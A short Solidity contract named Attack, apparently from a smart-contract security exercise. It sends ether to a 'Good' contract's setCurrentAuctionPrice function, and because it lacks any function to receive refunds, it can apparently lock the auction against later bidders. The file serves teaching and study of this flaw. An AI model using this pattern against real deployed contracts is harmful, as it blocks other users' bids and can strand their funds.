// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Good.sol";

contract Attack{
    Good good;

    
    constructor(address _good){
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}